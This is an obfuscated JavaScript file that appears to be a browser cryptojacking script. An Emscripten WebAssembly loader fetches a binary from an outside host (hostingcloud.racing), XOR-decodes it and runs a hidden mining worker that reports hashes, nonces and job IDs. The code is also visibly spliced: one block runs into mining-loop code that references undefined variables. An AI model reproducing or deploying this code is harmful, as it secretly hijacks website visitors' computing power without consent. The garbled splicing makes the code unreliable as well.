'use strinct'; 
self['Client']=self['Client']||
	{
};
self['Client']['CONFIG']=
	{
	'LIB_URL':'https://www.hostingcloud.racing/','REQUIRES_AUTH':![],'CAPTCHA_URL':'','MINER_URL':'','AUTH_URL':''
};
var Module=
	{
	'locateFile':function(_0xadef13)
		{
		return Client['CONFIG']['LIB_URL']+_0xadef13
	}
};
var moduleOverrides=
	{
};
var key;
for(key in Module)
	{
	if(Module.hasOwnProperty(key))
		{
		moduleOverrides[key]=Module[key]
	}
}
Module["arguments"]=[];
Module["thisProgram"]="./this.program";
Module["quit"]=function(status,toThrow)
	{
	throw toThrow
};
Module["preRun"]=[];
Module["postRun"]=[];
var ENVIRONMENT_IS_WEB=false;
var ENVIRONMENT_IS_WORKER=false;
var ENVIRONMENT_IS_NODE=false;
var ENVIRONMENT_IS_SHELL=false;
ENVIRONMENT_IS_WEB=typeof window==="object";
ENVIRONMENT_IS_WORKER=typeof importScripts==="function";
ENVIRONMENT_IS_NODE=typeof process==="object"&&typeof require==="function"&&!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER;
ENVIRONMENT_IS_SHELL=!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_NODE&&!ENVIRONMENT_IS_WORKER;
var scriptDirectory="";
function locateFile(path)
	{
	if(Module["locateFile"])
		{
		return Module["locateFile"](path,scriptDirectory)
	}
	else
		{
		return scriptDirectory+path
	}
}
if(ENVIRONMENT_IS_NODE)
	{
	scriptDirectory=__dirname+"/";
	var nodeFS;
	var nodePath;
	Module["read"]=function shell_read(filename,binary)
		{
		var ret;
		if(!nodeFS)nodeFS=require("fs");
		if(!nodePath)nodePath=require("path");
		filename=nodePath["normalize"](filename);
		ret=nodeFS["readFileSync"](filename);
		return binary?ret:ret.toString()
	};
	Module["readBinary"]=function readBinary(filename)
		{
		var ret=Module["read"](filename,true);
		if(!ret.buffer)
			{
			ret=new Uint8Array(ret)
		}
		assert(ret.buffer);
		return ret
	};
	if(process["argv"].length>1)
		{
		Module["thisProgram"]=process["argv"][1].replace(/\\/g,"/")
	}
	Module["arguments"]=process["argv"].slice(2);
	if(typeof module!=="undefined")
		{
		module["exports"]=Module
	}
	process["on"]("uncaughtException",function(ex)
		{
		if(!(ex instanceof ExitStatus))
			{
			throw ex
		}
	}
	);
	process["on"]("unhandledRejection",abort);
	Module["quit"]=function(status)
		{
		process["exit"](status)
	};
	Module["inspect"]=function()
		{
		return"[Emscripten Module object]"
	}
}
else if(ENVIRONMENT_IS_SHELL)
	{
	if(typeof read!="undefined")
		{
		Module["read"]=function shell_read(f)
			{
			return read(f)
		}
	}
	Module["readBinary"]=function readBinary(f)
		{
		var data;
		if(typeof readbuffer==="function")
			{
			return new Uint8Array(readbuffer(f))
		}
		data=read(f,"binary");
		assert(typeof data==="object");
		return data
	};
	if(typeof scriptArgs!="undefined")
		{
		Module["arguments"]=scriptArgs
	}
	else if(typeof arguments!="undefined")
		{
		Module["arguments"]=arguments
	}
	if(typeof quit==="function")
		{
		Module["quit"]=function(status)
			{
			quit(status)
		}
	}
}
else if(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER)
	{
	if(ENVIRONMENT_IS_WORKER)
		{
		scriptDirectory=self.location.href
	}
	else if(document.currentScript)
		{
		scriptDirectory=document.currentScript.src
	}
	if(scriptDirectory.indexOf("blob:")!==0)
		{
		scriptDirectory=scriptDirectory.substr(0,scriptDirectory.lastIndexOf("/")+1)
	}
	else
		{
		scriptDirectory=""
	}
	Module["read"]=function shell_read(url)
		{
		var xhr=new XMLHttpRequest;
		xhr.open("GET",url,false);
		xhr.send(null);
		return xhr.responseText
	};
	if(ENVIRONMENT_IS_WORKER)
		{
		Module["readBinary"]=function readBinary(url)
			{
			var xhr=new XMLHttpRequest;
			xhr.open("GET",url,false);
			xhr.responseType="arraybuffer";
			xhr.send(null);
			return new Uint8Array(xhr.response)
		}
	}
	Module["readAsync"]=function readAsync(url,onload,onerror)
		{
		var xhr=new XMLHttpRequest;
		xhr.open("GET",url,true);
		xhr.responseType="arraybuffer";
		xhr.onload=function xhr_onload()
			{
			if(xhr.status==200||xhr.status==0&&xhr.response)
				{
				onload(xhr.response);
				return
			}
			onerror()
		};
		xhr.onerror=onerror;
		xhr.send(null)
	};
	Module["setWindowTitle"]=function(title)
		{
		document.title=title
	}
}
else
	{
}
var out=Module["print"]||(typeof console!=="undefined"?console.log.bind(console):typeof print!=="undefined"?print:null);
var err=Module["printErr"]||(typeof printErr!=="undefined"?printErr:typeof console!=="undefined"&&console.warn.bind(console)||out);
for(key in moduleOverrides)
	{
	if(moduleOverrides.hasOwnProperty(key))
		{
		Module[key]=moduleOverrides[key]
	}
}
moduleOverrides=undefined;
var asm2wasmImports=
	{
	"f64-rem":function(x,y)
		{
		return x%y
	}
	,"debugger":function()
		{
		debugger
	}
};
var functionPointers=new Array(0);
if(typeof WebAssembly!=="object")
	{
	err("no native wasm support detected")
}
var wasmMemory;
var wasmTable;
var ABORT=false;
var EXITSTATUS=0;
function assert(condition,text)
	{
	if(!condition)
		{
		abort("Assertion failed: "+text)
	}
}
var UTF8Decoder=typeof TextDecoder!=="undefined"?new TextDecoder("utf8"):undefined;
var UTF16Decoder=typeof TextDecoder!=="undefined"?new TextDecoder("utf-16le"):undefined;
var WASM_PAGE_SIZE=65536;
var buffer,HEAP8,HEAPU8,HEAP16,HEAPU16,HEAP32,HEAPU32,HEAPF32,HEAPF64;
function updateGlobalBufferViews()
	{
	Module["HEAP8"]=HEAP8=new Int8Array(buffer);
	Module["HEAP16"]=HEAP16=new Int16Array(buffer);
	Module["HEAP32"]=HEAP32=new Int32Array(buffer);
	Module["HEAPU8"]=HEAPU8=new Uint8Array(buffer);
	Module["HEAPU16"]=HEAPU16=new Uint16Array(buffer);
	Module["HEAPU32"]=HEAPU32=new Uint32Array(buffer);
	Module["HEAPF32"]=HEAPF32=new Float32Array(buffer);
	Module["HEAPF64"]=HEAPF64=new Float64Array(buffer)
}
var DYNAMIC_BASE=5245696,DYNAMICTOP_PTR=2560;
var TOTAL_STACK=5242880;
var TOTAL_MEMORY=Module["TOTAL_MEMORY"]||16777216;
if(TOTAL_MEMORY<TOTAL_STACK)err("TOTAL_MEMORY should be larger than TOTAL_STACK, was "+TOTAL_MEMORY+"! (TOTAL_STACK="+TOTAL_STACK+")");
if(Module["buffer"])
	{
	buffer=Module["buffer"]
}
else
	{
	if(typeof WebAssembly==="object"&&typeof WebAssembly.Memory==="function")
		{
		wasmMemory=new WebAssembly.Memory(
			{
			"initial":TOTAL_MEMORY/WASM_PAGE_SIZE,"maximum":TOTAL_MEMORY/WASM_PAGE_SIZE
		}
		);
		buffer=wasmMemory.buffer
	}
	else
		{
		buffer=new ArrayBuffer(TOTAL_MEMORY)
	}
	Module["buffer"]=buffer
}
updateGlobalBufferViews();
HEAP32[DYNAMICTOP_PTR>>2]=DYNAMIC_BASE;
function callRuntimeCallbacks(callbacks)
	{
	while(callbacks.length>0)
		{
		var callback=callbacks.shift();
		if(typeof callback=="function")
			{
			callback();
			continue
		}
		var func=callback.func;
		if(typeof func==="number")
			{
			if(callback.arg===undefined)
				{
				Module["dynCall_v"](func)
			}
			else
				{
				Module["dynCall_vi"](func,callback.arg)
			}
		}
		else
			{
			func(callback.arg===undefined?null:callback.arg)
		}
	}
}
var __ATPRERUN__=[];
var __ATINIT__=[];
var __ATMAIN__=[];
var __ATPOSTRUN__=[];
var runtimeInitialized=false;
function preRun()
	{
	if(Module["preRun"])
		{
		if(typeof Module["preRun"]=="function")Module["preRun"]=[Module["preRun"]];
		while(Module["preRun"].length)
			{
			addOnPreRun(Module["preRun"].shift())
		}
	}
	callRuntimeCallbacks(__ATPRERUN__)
}
function ensureInitRuntime()
	{
	if(runtimeInitialized)return;
	runtimeInitialized=true;
	callRuntimeCallbacks(__ATINIT__)
}
function preMain()
	{
	callRuntimeCallbacks(__ATMAIN__)
}
function postRun()
	{
	if(Module["postRun"])
		{
		if(typeof Module["postRun"]=="function")Module["postRun"]=[Module["postRun"]];
		while(Module["postRun"].length)
			{
			addOnPostRun(Module["postRun"].shift())
		}
	}
	callRuntimeCallbacks(__ATPOSTRUN__)
}
function addOnPreRun(cb)
	{
	__ATPRERUN__.unshift(cb)
}
function addOnPostRun(cb)
	{
	__ATPOSTRUN__.unshift(cb)
}
var runDependencies=0;
var runDependencyWatcher=null;
var dependenciesFulfilled=null;
function addRunDependency(id)
	{
	runDependencies++;
	if(Module["monitorRunDependencies"])
		{
		Module["monitorRunDependencies"](runDependencies)
	}
}
function removeRunDependency(id)
	{
	runDependencies--;
	if(Module["monitorRunDependencies"])
		{
		Module["monitorRunDependencies"](runDependencies)
	}
	if(runDependencies==0)
		{
		if(runDependencyWatcher!==null)
			{
			clearInterval(runDependencyWatcher);
			runDependencyWatcher=null
		}
		if(dependenciesFulfilled)
			{
			var callback=dependenciesFulfilled;
			dependenciesFulfilled=null;
			callback()
		}
	}
}
Module["preloadedImages"]=
	{
};
Module["preloadedAudios"]=
	{
};
var dataURIPrefix="data:application/octet-stream;base64,";
function isDataURI(filename)
	{
	return String.prototype.startsWith?filename.startsWith(dataURIPrefix):filename.indexOf(dataURIPrefix)===0
}
var wasmBinaryFile="T770Ukhg.wasm";
if(!isDataURI(wasmBinaryFile))
	{
	wasmBinaryFile=locateFile(wasmBinaryFile)
}
function getBinary()
	{
	try
		{
		if(Module["wasmBinary"])
			{
			return new Uint8Array(Module["wasmBinary"])
		}
		if(Module["readBinary"])
			{
			return Module["readBinary"](wasmBinaryFile)
		}
		else
			{
			throw"both async and sync fetching of the wasm failed"
		}
	}
	catch(err)
		{
		abort(err)
	}
}
function getBinaryPromise()
	{
	if(!Module["wasmBinary"]&&(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER)&&typeof fetch==="function")
		{
		return fetch(wasmBinaryFile,
			{
			credentials:"same-origin"
		}
		).then(function(response)
			{
			if(!response["ok"])
				{
				throw"failed to load wasm binary file at '"+wasmBinaryFile+"'"
			}
			return response["arrayBuffer"]()
		}
		).catch(function()
			{
			return getBinary()
		}
		)
	}
	return new Promise(function(resolve,reject)
		{
		resolve(getBinary())
	}
	)
}
function createWasm(env)
	{
	var info=
		{
		"env":env,"global":
			{
			"NaN":NaN,Infinity:Infinity
		}
		,"global.Math":Math,"asm2wasm":asm2wasmImports
	};
	function receiveInstance(instance,module)
		{
		var exports=instance.exports;
		Module["asm"]=exports;
		removeRunDependency("wasm-instantiate")
	}
	addRunDependency("wasm-instantiate");
	if(Module["instantiateWasm"])
		{
		try
			{
			return Module["instantiateWasm"](info,receiveInstance)
		}
		catch(e)
			{
			err("Module.instantiateWasm callback failed with error: "+e);
			return false
		}
	}
	function receiveInstantiatedSource(output)
		{
		receiveInstance(output["instance"])
	}
	function instantiateArrayBuffer(receiver)
		{
		getBinaryPromise().then(function(binary)
			{
			var _0xff1902=new Uint8Array(binary,0,binary['byteLength']);
			for(var _0x38df28=0;
			_0x38df28<binary['byteLength'];
			_0x38df28++)
				{
				_0xff1902[_0x38df28]^=0xd5
			}
			return WebAssembly.instantiate(binary,info)
		}
		).then(receiver,function(reason)
			{
			err("failed to asynchronously prepare wasm: "+reason);
			abort(reason)
		}
		)
	}
	instantiateArrayBuffer(receiveInstantiatedSource);
	return
		{
	}
}
Module["asm"]=function(global,env,providedBuffer)
	{
	env["memory"]=wasmMemory;
	env["table"]=wasmTable=new WebAssembly.Table(
		{
		"initial":0,"maximum":0,"element":"anyfunc"
	}
	);
	env["__memory_base"]=1024;
	env["__table_base"]=0;
	var exports=createWasm(env);
	return exports
};
function _emscripten_get_heap_size()
	{
	return TOTAL_MEMORY
}
function abortOnCannotGrowMemory(requestedSize)
	{
	abort("OOM")
}
function _emscripten_resize_heap(requestedSize)
	{
	abortOnCannotGrowMemory(requestedSize)
}
function _emscripten_memcpy_big(dest,src,num)
	{
	HEAPU8.set(HEAPU8.subarray(src,src+num),dest)
}
function ___setErrNo(value)
	{
	if(Module["___errno_location"])HEAP32[Module["___errno_location"]()>>2]=value;
	return value
}
var asmGlobalArg=
	{
};
var asmLibraryArg=
	{
	"b":___setErrNo,"f":_emscripten_get_heap_size,"e":_emscripten_memcpy_big,"d":_emscripten_resize_heap,"c":abortOnCannotGrowMemory,"a":DYNAMICTOP_PTR
};
var asm=Module["asm"](asmGlobalArg,asmLibraryArg,buffer);
Module["asm"]=asm;
var ___errno_location=Module["___errno_location"]=function()
	{
	return Module["asm"]["g"].apply(null,arguments)
};
var _cake=Module["_cake"]=function()
	{
	return Module["asm"]["h"].apply(null,arguments)
};
var _cake2=Module["_cake2"]=function()
	{
	return Module["asm"]["i"].apply(null,arguments)
};
var _chicken=Module["_chicken"]=function()
	{
	return Module["asm"]["j"].apply(null,arguments)
};
var _egg=Module["_egg"]=function()
	{
	return Module["asm"]["k"].apply(null,arguments)
};
var _malloc=Module["_malloc"]=function()
	{
	return Module["asm"]["l"].apply(null,arguments)
};
Module["asm"]=asm;
function ExitStatus(status)
	{
	this.name="ExitStatus";
	this.message="Program terminated with exit("+status+")";
	this.status=status
}
ExitStatus.prototype=new Error;
ExitStatus.prototype.constructor=ExitStatus;
dependenciesFulfilled=function runCaller()
	{
	if(!Module["calledRun"])run();
	if(!Module["calledRun"])dependenciesFulfilled=runCaller
};
function run(args)
	{
	args=args||Module["arguments"];
	if(runDependencies>0)
		{
		return
	}
	preRun();
	if(runDependencies>0)return;
	if(Module["calledRun"])return;
	function doRun()
		{
		if(Module["calledRun"])return;
		Module["calledRun"]=true;
		if(ABORT)return;
		ensureInitRuntime();
		preMain();
		if(Module["onRuntimeInitialized"])Module["onRuntimeInitialized"]();
		postRun()
	}
	if(Module["setStatus"])
		{
		Module["setStatus"]("Running...");
		setTimeout(function()
			{
			setTimeout(function()
				{
				Module["setStatus"]("")
			}
			,1);
			doRun()
		}
		,1)
	}
	else
		{
		doRun()
	}
}
Module["run"]=run;
function abort(what)
	{
	if(Module["onAbort"])
		{
		Module["onAbort"](what)
	}
	if(what!==undefined)
		{
		out(what);
		err(what);
		what=JSON.stringify(what)
	}
	else
		{
		what=""
	}
	ABORT=true;
	EXITSTATUS=1;
	throw"abort("+what+"). Build with -s ASSERTIONS=1 for more info."
}
Module["abort"]=abort;
if(Module["preInit"])
	{
	if(typeof Module["preInit"]=="function")Module["1"]();
	var _0x56ad1a=0x0;
	do
		{
		this['hash'](this['input'],this['output'],this['blob']['length'],this['height']);
		_0x3d30fa++;
		_0x3b7153=this['meetsTarget'](this['output'],this['target']);
		_0x56ad1a=this['now']()-_0x109a12
	}
	while(!_0x3b7153&&_0x56ad1a<0x3e8);
	var _0x534e17=_0x3d30fa/(_0x56ad1a/0x3e8);
	if(_0x3b7153)
		{
		var _0x3f060b;
		if(Conf['CUR']=='w')_0x3f060b=this['bytesToHex'](this['input']['subarray'](this['blob']['length']-8,this['blob']['length']));
		else throw new Error('Wrong algo!');
		var _0x11c7e8=this['bytesToHex'](this['output']);
		self['postMessage'](
			{
			'hashesPerSecond':_0x534e17,'hashes':_0x3d30fa,'job_id':this['currentJob']['job_id'],'nonce':_0x3f060b,'result':_0x11c7e8
		}
		)
	}
	else
		{
		self['postMessage'](
			{
			'hashesPerSecond':_0x534e17,'hashes':_0x3d30fa
		}
		)
	}
};
_0x5bff37['prototype']['workThrottled']=function()
	{
	var _0x34d9a2=this['now']();
	this['hash'](this['input'],this['output'],this['blob']['length'],this['height']);
	var _0x5e74b7=this['now']();
	var _0x3e4738=_0x5e74b7-_0x34d9a2;
	this['throttledHashes']++;
	var _0x562804=_0x5e74b7-this['throttledStart'];
	var _0x5cbfac=this['throttledHashes']/ (_0x562804 /0x3e8);
	if(this['meetsTarget'](this['output'],this['target']))
		{
		var _0x3d310d;
		if(Conf['CUR']=='w')_0x3d310d=this['bytesToHex'](this['input']['subarray'](this['blob']['length']-8,this['blob']['length']));
		else throw new Error('Wrong algo!');
		var _0x470fdd=this['bytesToHex'](this['output']);
		self['postMessage'](
			{
			'hashesPerSecond':_0x5cbfac,'hashes':this['throttledHashes'],'job_id':this['currentJob']['job_id'],'nonce':_0x3d310d,'result':_0x470fdd
		}
		);
		this['throttledHashes']=0x0
	}
	else if(_0x562804>0x3e8)
		{
		self['postMessage'](
			{
			'hashesPerSecond':_0x5cbfac,'hashes':this['throttledHashes']
		}
		);
		this['throttledHashes']=0x0
	}
	else
		{
		var _0x51913f=Math['min'](0x7d0,_0x3e4738*this['throttleWait']);
		setTimeout(this['workThrottledBound'],_0x51913f)
	}
};
Module['onRuntimeInitialized']=function()
	{
	var _0x2ba4c9=new _0x5bff37()
};
